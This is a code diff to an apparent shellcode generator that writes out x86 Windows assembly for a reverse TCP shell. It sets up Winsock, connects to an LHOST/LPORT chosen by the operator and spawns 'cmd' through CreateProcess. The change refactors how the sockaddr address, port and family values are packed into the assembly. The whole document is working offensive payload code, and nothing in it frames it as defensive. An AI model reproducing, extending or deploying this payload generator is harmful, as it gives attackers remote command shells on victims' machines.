@@ -74,11 +74,11 @@ class Shellcode():
 
         sc_args = builder.init_sc_args(self.dependencies)
         sc_args.update({ 
-            "wsaData"                       : 0x000,
-            "name"                          : 0x010,
+            "wsaData"                       : 0x00,
+            "name"                          : ctypes.sizeof(ws2def.sockaddr),
             "lpStartupInfo"                 : ctypes.sizeof(processthreadsapi._STARTUPINFOA),
             "lpCommandLine"                 : len("cmd\x00"),
-            "lpProcessInformation"          : 0x000,
+            "lpProcessInformation"          : 0x00,
         })
 
         self.stack_space = builder.calc_stack_space(sc_args, Shellcode.arch)
@@ -247,6 +247,10 @@ get_{imports[func]}:
             lport = int(argv_dict["LPORT"])
 
 
+        sin_addr = hex(convert.ip_str_to_inet_addr(argv_dict['LHOST']))
+        sin_port = struct.pack('<H', lport).hex()
+        sin_family = struct.pack('>H', ws2def.AF_INET).hex()
+
         shellcode = f"""
 _start:
     push ebp
@@ -302,10 +306,8 @@ call_connect:
     xor ecx, ecx
     mov cl, {ctypes.sizeof(ws2def.sockaddr)}
     push ecx
-
-    mov dword ptr [ebp - {self.storage_offsets['name'] - 0x04}], {hex(convert.ip_str_to_inet_addr(argv_dict['LHOST']))}
-    mov dword ptr [ebp - {self.storage_offsets['name']}], 0x{struct.pack('<H', lport).hex()}0002
-
+    mov dword ptr [ebp - {self.storage_offsets['name'] - 0x04}], {sin_addr}
+    mov dword ptr [ebp - {self.storage_offsets['name']}], 0x{sin_port}{sin_family}
     lea ecx, [ebp - {self.storage_offsets['name']}]
     push ecx
     push esi
